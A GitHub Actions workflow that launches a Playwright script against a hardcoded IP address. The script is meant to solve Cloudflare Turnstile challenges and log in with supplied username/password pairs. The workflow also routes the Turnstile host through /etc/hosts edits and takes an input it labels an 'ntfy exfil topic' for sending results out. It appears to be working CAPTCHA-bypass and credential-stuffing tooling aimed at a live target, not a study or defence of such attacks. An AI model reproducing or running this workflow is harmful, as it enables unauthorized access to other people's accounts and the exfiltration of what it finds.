name: i52970turnstile
on:
  workflow_dispatch:
    inputs:
      creds:
        description: "JSON credential pairs [{u,p},...] (optional)"
        required: false
        default: ""
      nt:
        description: "ntfy exfil topic"
        required: false
        default: ""
permissions:
  contents: read
jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - name: egress ip
        run: |
          echo "=== runner info ==="; id
          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/EGRESS_IP=/'
          echo "=== reach target ==="
          curl -s -m 15 -o /dev/null -w "target_http=%{http_code}\n" http://135.148.204.37/api/status
      - name: install deps
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
          python3 -m pip install --quiet --upgrade pip
          python3 -m pip install --quiet playwright
          python3 -m playwright install --with-deps chromium 2>&1 | tail -3
      - name: patch dns (brunhild is IPv6-only upstream; runners are IPv4-only)
        run: |
          echo "104.18.16.146 brunhild.challenges.cloudflare.com" | sudo tee -a /etc/hosts
          echo "104.18.17.146 brunhild.challenges.cloudflare.com" | sudo tee -a /etc/hosts
          echo "=== verify brunhild reachable over v4 ==="
          curl -s -m 10 -o /dev/null -w "brunhild_http=%{http_code}\n" https://brunhild.challenges.cloudflare.com/cdn-cgi/challenge-platform/ || true
      - name: run solver
        env:
          TARGET: "http://135.148.204.37"
          CREDS: ${{ github.event.inputs.creds }}
          NT: ${{ github.event.inputs.nt }}
        run: |
          xvfb-run -a --server-args="-screen 0 1280x900x24" python3 solve_and_login.py
      - name: upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: diag
          path: |
            results.json
            *.png
          if-no-files-found: ignore
